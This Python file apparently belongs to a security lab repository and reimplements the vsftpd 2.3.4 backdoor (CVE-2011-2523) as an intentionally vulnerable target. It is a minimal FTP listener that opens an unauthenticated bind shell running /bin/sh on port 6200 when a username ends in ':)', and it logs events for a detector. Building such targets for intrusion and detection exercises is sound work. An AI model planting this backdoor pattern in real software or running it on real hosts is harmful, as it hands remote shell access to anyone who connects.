"""
A minimal, real, working reproduction of the documented CVE-2011-2523
vsftpd 2.3.4 backdoor trigger and resulting shell -- NOT the literal 2011
compromised binary (no reliable, verifiable way to source that safely), but
a faithful implementation of its publicly-documented behavior: a real FTP
control-connection listener that, on seeing a username ending in ":)",
opens a real bind shell on port 6200. Same "real, not simulated" bar as
every other target in this repo -- a genuine socket listener, a genuine
subprocess shell, genuinely triggerable with a real FTP client, not a
scripted/fake result. See specs/network-intrusion.md for why this
approach was chosen over depending on an unverified third-party image
(one candidate was checked and found to no longer exist on Docker Hub).

Speaks just enough of RFC 959 (FTP) to be realistically recon-able (a real
banner, real USER/PASS response codes) -- full file-transfer functionality
isn't needed since the attacker's actual objective here is the backdoor
trigger, not FTP itself.

Stdlib only, matching the rest of this repo's Python.
"""
import json
import os
import socket
import subprocess
import threading
import time

FTP_PORT = int(os.environ.get("FTP_PORT", "21"))
BACKDOOR_PORT = int(os.environ.get("BACKDOOR_PORT", "6200"))
LOG_PATH = os.environ.get("LOG_PATH", "/logs/ftp.jsonl")
BANNER = b"220 (vsFTPd 2.3.4)\r\n"
LOG_LOCK = threading.Lock()


def log_event(**fields):
    """Real, independent connection log the detector tails -- same
    proxy-access-log pattern as scenarios/web-exploit/proxy/server.py,
    not something the attacker's own tooling ever sees or controls."""
    fields.setdefault("ts", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    line = json.dumps(fields)
    print(f"[ftp] {line}", flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        with LOG_LOCK, open(LOG_PATH, "a") as f:
            f.write(line + "\n")
    except OSError as e:
        print(f"[warn] could not write log: {e}", flush=True)


def spawn_backdoor_shell(addr):
    """Opens a REAL bind shell on BACKDOOR_PORT -- a genuine subprocess
    with its stdio wired to the socket, not a scripted response."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", BACKDOOR_PORT))
    srv.listen(1)
    log_event(event="backdoor_listening", port=BACKDOOR_PORT, trigger_source=addr[0])
    conn, shell_addr = srv.accept()
    log_event(event="backdoor_shell_connected", source=shell_addr[0])
    subprocess.Popen(
        ["/bin/sh", "-i"],
        stdin=conn.fileno(), stdout=conn.fileno(), stderr=conn.fileno(),
    ).wait()
    conn.close()
    srv.close()


def handle_ftp_client(conn, addr):
    conn.sendall(BANNER)
    triggered = False
    try:
        buf = b""
        while True:
            data = conn.recv(256)
            if not data:
                break
            buf += data
            while b"\r\n" in buf:
                line, buf = buf.split(b"\r\n", 1)
                line = line.decode(errors="replace").strip()
                if not line:
                    continue
                if line.upper().startswith("USER "):
                    username = line[5:].strip()
                    conn.sendall(b"331 Please specify the password.\r\n")
                    log_event(event="ftp_user", source=addr[0], username=username)
                    if username.endswith(":)") and not triggered:
                        triggered = True
                        log_event(event="backdoor_trigger", source=addr[0], username=username)
                        threading.Thread(target=spawn_backdoor_shell, args=(addr,), daemon=True).start()
                elif line.upper().startswith("PASS "):
                    conn.sendall(b"230 Login successful.\r\n")
                elif line.upper().startswith("QUIT"):
                    conn.sendall(b"221 Goodbye.\r\n")
                    return
                else:
                    conn.sendall(b"502 Command not implemented.\r\n")
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        conn.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", FTP_PORT))
    srv.listen(5)
    log_event(event="startup", port=FTP_PORT)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_ftp_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
